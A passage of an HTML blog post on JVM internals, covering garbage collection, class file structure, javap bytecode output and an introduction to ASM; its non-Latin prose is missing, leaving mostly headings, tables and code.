</p>\n<ul>\n<li>CAS</li>\n<li></li>\n</ul>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>null</p>\n<h5 id=\"-Object-Header\"><a href=\"#-Object-Header\" class=\"headerlink\" title=\" (Object Header)\"></a> (Object Header)</h5><p>Javahash code(<code>Object#hashCode()</code>)GC<strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p><code>Unsafe#allocateInstance()</code>(GsonKtKtGson)</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>HotSpot: (Header)(Instance Data)(Padding)</p>\n<p>: HashCodeGCID32643264bitMark World</p>\n<p></p>\n<p>HotSpot88812</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>java<strong>reference</strong>()Javareference<strong></strong><strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><blockquote>\n<p> Javareference</p>\n</blockquote>\n<p>referenceGCreference</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png\" alt=\"20220708-221205\"></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><blockquote>\n<p>Javareference</p>\n</blockquote>\n<p>java<strong>HotSpot</strong></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png\" alt=\"20220708-221128\"></p>\n<h3 id=\"-GC\"><a href=\"#-GC\" class=\"headerlink\" title=\" (GC)\"></a> (GC)</h3><p></p>\n<h4 id=\"-amp-\"><a href=\"#-amp-\" class=\"headerlink\" title=\" &amp; \"></a> &amp; </h4><p>Java</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>+1-10</p>\n<p>Java</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>JavaC#<strong></strong><strong>GC Roots</strong><strong></strong>GC Roots<strong></strong></p>\n<p>GC Roots:</p>\n<ul>\n<li></li>\n<li> Java</li>\n<li> </li>\n<li>JNI</li>\n<li>Java<strong>Class</strong>NullPointerException</li>\n</ul>\n<p><img src=\"https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>GCGCJDK1.2Java<strong></strong></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC<code>SoftReference</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>GC<code>WeakReference</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p><code>PhantomReference</code></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p></p>\n<p></p>\n<p>Java<strong></strong><strong></strong><strong></strong>HotSpotJDK8JDK8<strong></strong><strong></strong></p>\n<p>HotSpotEdenSurvivor811GC</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg\" alt=\"image-20220222151708141\"></p>\n<p></p>\n<p>Eden</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg\" alt=\"image-20220222153104582\"></p>\n<p>EdenSurvivorFromToGCEdenFromFromToFromToToFrom</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg\" alt=\"image-20220222154032674\"></p>\n<p>FromEdenFromToGC<code>+1</code><code>15</code>From</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg\" alt=\"image-20220222154828416\"></p>\n<p>ToFrom</p>\n<p></p>\n<ul>\n<li><p>Minor GC   -   </p>\n<ul>\n<li>Eden</li>\n</ul>\n</li>\n<li><p>Major GC   -   </p>\n</li>\n<li><p>Full GC      -    Java</p>\n<ul>\n<li>1</li>\n<li>2Minor GC</li>\n<li>3JDK8</li>\n<li>4<code>System.gc()</code></li>\n</ul>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg\" alt=\"image-20220222205605690\"></p>\n</li>\n</ul>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p><code>-</code></p>\n<p>GC Roots</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg\" alt=\"image-20220222165709034\"></p>\n<p> </p>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p>-</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg\" alt=\"image-20220222210942507\"></p>\n<p>Survivor8:1:1</p>\n<h5 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"-\"></a>-</h5><p>-GCGC50%</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg\" alt=\"image-20220222213208681\"></p>\n<p>Stop The World</p>\n<p></p>\n<h4 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" ()\"></a> ()</h4><h5 id=\"Serial\"><a href=\"#Serial\" class=\"headerlink\" title=\"Serial\"></a>Serial</h5><p>JDK1.3.1</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg\" alt=\"image-20220223104605648\"></p>\n<p>GC15</p>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<h5 id=\"ParNew\"><a href=\"#ParNew\" class=\"headerlink\" title=\"ParNew\"></a>ParNew</h5><p>Serial</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg\" alt=\"image-20220223111344962\"></p>\n<p>SerialJVMParNew</p>\n<h5 id=\"CMS\"><a href=\"#CMS\" class=\"headerlink\" title=\"CMS\"></a>CMS</h5><p>JDK1.5HotSpotCMSConcurrent-Mark-SweepHotSpotGCGC</p>\n<p></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg\" alt=\"image-20220223114019381\"></p>\n<p>4</p>\n<ul>\n<li>GC Roots</li>\n<li>GC Roots</li>\n<li></li>\n<li></li>\n</ul>\n<p>Full GC</p>\n<p>GCG1CMS</p>\n<h5 id=\"Garbage-First-JDK9\"><a href=\"#Garbage-First-JDK9\" class=\"headerlink\" title=\"Garbage First (JDK9+)\"></a>Garbage First (JDK9+)</h5><p>JDK7JDK9JDK8 Parallel Scavenge + Parallel Old </p>\n<p><code>Minor GC</code><code>Major GC </code><code>Full GC</code>G1Java<code>2048</code><code>Region</code><code>Region</code>1MB32MB2N<code>Region</code>JVM</p>\n<p><code>Region</code><code>Region</code>EdenSurvivorG1HumongousRegion</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg\" alt=\"image-20220223123636582\"></p>\n<p>CMS</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg\" alt=\"image-20220223123557871\"></p>\n<p></p>\n<ul>\n<li>GC RootsTAMSRegionMinor GCG1</li>\n<li>GC Root</li>\n<li></li>\n<li>RegionRegionRegionRegionRegionRegion</li>\n</ul>\n<h5 id=\"Shenandoah-amp-ZGC-\"><a href=\"#Shenandoah-amp-ZGC-\" class=\"headerlink\" title=\"Shenandoah &amp; ZGC ()\"></a>Shenandoah &amp; ZGC ()</h5><p>G1G1GC</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>:D</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>JavaJVMJarJarclassclassclassKotlinJavaktJavaKotlinJVM</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Class888ClassC: <strong></strong>, <strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestClazz</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute sum function.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>javap -verbose</code> </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Classfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"&lt;init&gt;\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               &lt;init&gt;\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"&lt;init&gt;\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"&lt;init&gt;\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"-amp-Class\"><a href=\"#-amp-Class\" class=\"headerlink\" title=\" &amp; Class\"></a> &amp; Class</h4><p>class4Byte(Magic Number), classByteclass<code>0xCAFE BABE</code>Java:)</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg\" alt=\"aZx0S4EjfY\"></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg\" alt=\"20220709-173350\"></p>\n<p>7341652Java8</p>\n<p>56Minor Version,78Major VersionJava45JDK1.1JDK+1JDKClassClass</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Constant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"&lt;init&gt;\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               &lt;init&gt;\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"&lt;init&gt;\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassClass</p>\n<p>1</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Utf8_info</td>\n<td align=\"center\">1</td>\n<td align=\"center\">UTF-8</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Integer_info</td>\n<td align=\"center\">3</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">7</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_String_info</td>\n<td align=\"center\">8</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Fieldref_info</td>\n<td align=\"center\">9</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">10</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_MethodType_info</td>\n<td align=\"center\">16</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">12</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<p></p>\n<p><code>CONSTANT_Methodref_info</code>Java 222</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">10</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">CONSTANT_Class_info</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n</tr>\n</tbody></table>\n<p><code>CONSTANT_Class_info</code><code>CONSTANT_NameAndType_info</code></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>sumNameAndType</p>\n<blockquote>\n<p>#30 = NameAndType        #23:#24        // sum:(II)I</p>\n</blockquote>\n<p>#23<code>sum</code>#24<code>(II)I</code></p>\n<p>(II)IIintIint</p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg\" alt=\"image-20220223192518999\"></p>\n<p><code>()V</code>void</p>\n<p>:</p>\n<blockquote>\n<p>public Set<arathothattribute> getAttrInstSet()</arathothattribute></p>\n<p>()Ljava/util/Set&lt;ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;&gt;;</p>\n<p></p>\n<p></p>\n</blockquote>\n<blockquote>\n<p>public Double getRandom(Double value1, Double value2)</p>\n<p>(Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;</p>\n<p></p>\n<p></p>\n<p>public double sum(Double value1, double value2) {</p>\n<p>\t\treturn value1 + value2;</p>\n<p>}</p>\n<p>:), value1doubleValue()</p>\n<p>java</p>\n</blockquote>\n<blockquote>\n<p></p>\n<p>public double[] getRandomNums()</p>\n<p>()[D</p>\n<p>[</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>//</p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg\" alt=\"image-20220223200619811\"></p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg\" alt=\"image-20220223201053780\"></p>\n<p>:</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ACC_PUBLIC</td>\n<td>0x0001</td>\n<td>public</td>\n</tr>\n<tr>\n<td>ACC_PRIVATE</td>\n<td>0x0002</td>\n<td>private</td>\n</tr>\n<tr>\n<td>ACC_PROTECTED</td>\n<td>0x0004</td>\n<td>protected</td>\n</tr>\n<tr>\n<td>ACC_STATIC</td>\n<td>0x0008</td>\n<td>static</td>\n</tr>\n<tr>\n<td>ACC_FINAL</td>\n<td>0x0010</td>\n<td>final</td>\n</tr>\n<tr>\n<td>ACC_SYNCHRONIZED</td>\n<td>0x0020</td>\n<td>synchronized</td>\n</tr>\n<tr>\n<td>ACC_BRIDGE</td>\n<td>0x0040</td>\n<td></td>\n</tr>\n<tr>\n<td>ACC_VARARGS</td>\n<td>0x0080</td>\n<td></td>\n</tr>\n<tr>\n<td>ACC_NATIVE</td>\n<td>0x0100</td>\n<td>native</td>\n</tr>\n<tr>\n<td>ACC_ABSTRACT</td>\n<td>0x0400</td>\n<td>abstract</td>\n</tr>\n<tr>\n<td>ACC_STRICT</td>\n<td>0x0800</td>\n<td>strictfp</td>\n</tr>\n<tr>\n<td>ACC_SYNTHETIC</td>\n<td>0x1000</td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><blockquote>\n<p>ASM</p>\n</blockquote>\n<p><strong></strong><strong></strong>main</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre><code>Code:\n  stack=3, locals=3, args_size=1\n     0: iconst_1\n     1: istore_1\n     2: iconst_2\n     3: iload_1\n     4: iadd\n     5: istore_2\n     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n     9: iload_1\n    10: iload_2\n    11: invokestatic  #3                  // Method sum:(II)I\n    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n    17: return\n</code></pre>\n<hr>\n<blockquote>\n<p>iconst_1</p>\n</blockquote>\n<p>int<code>1</code><strong></strong>, 1<code>int a = 1</code>1</p>\n<blockquote>\n<p>istore_1</p>\n</blockquote>\n<p>int<strong></strong>1<code>1</code><code>int a = 1</code></p>\n<blockquote>\n<p>iconst_2</p>\n</blockquote>\n<p>int<code>2</code><strong></strong>2 <code>int b = 2 + a</code>2</p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>int<strong></strong>1<code>a</code></p>\n<blockquote>\n<p>iadd</p>\n</blockquote>\n<p><strong></strong>int<strong></strong><code>int b = 2 + a</code></p>\n<blockquote>\n<p>istore_2</p>\n</blockquote>\n<p>int<strong></strong><strong></strong>2<code>int b = 2 + a</code></p>\n<blockquote>\n<p>getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</p>\n</blockquote>\n<p><code>System.out</code>, <code>Ljava/io/PrintStream</code>,<strong></strong><code>#2</code><code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>int<code>a</code><strong></strong></p>\n<blockquote>\n<p>iload_2</p>\n</blockquote>\n<p>intb<strong></strong></p>\n<blockquote>\n<p>invokestatic  #3                  // Method sum:(II)I</p>\n</blockquote>\n<p>intint</p>\n<blockquote>\n<p>invokevirtual #4                  // Method java/io/PrintStream.println:(I)V</p>\n</blockquote>\n<p><code>PrintStream#println</code>receiverjavakotlinreceiver</p>\n<blockquote>\n<p>return</p>\n</blockquote>\n<p>void</p>\n<hr>\n<p><strong></strong></p>\n<p>jvm</p>\n<p>:)</p>\n<h3 id=\"ASM\"><a href=\"#ASM\" class=\"headerlink\" title=\"ASM\"></a>ASM</h3><p>ASM/Javassist/cglib/?</p>\n<ul>\n<li>/ gradlegradleshadowJar(relocate))</li>\n<li>InvocationHandler</li>\n<li>asm</li>\n<li>jvm<a href=\"https://github.com/MeiVinEight/ReflectionFX\">MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)</a>MethodHandle</li>\n</ul>\n<p></p>\n<p>androiddex</p>\n<p>asmjdkasmasm</p>\n<h4 id=\"ASM-Core-API-amp-Tree-API\"><a href=\"#ASM-Core-API-amp-Tree-API\" class=\"headerlink\" title=\"ASM Core API &amp; Tree API\"></a>ASM Core API &amp; Tree API</h4><h5 id=\"Core-API\"><a href=\"#Core-API\" class=\"headerlink\" title=\"Core API\"></a>Core API</h5><p>ASM ASMJar/class//ASM() kapt/kspasm, kapt/kspasm</p>\n<p><a href=\"https://www.runoob.com/design-pattern/visitor-pattern.html\"> |  (runoob.com)</a></p>\n<p>:</p>\n<p>ASMclassAPI</p>\n<pre class=\"line-numbers language-java\" 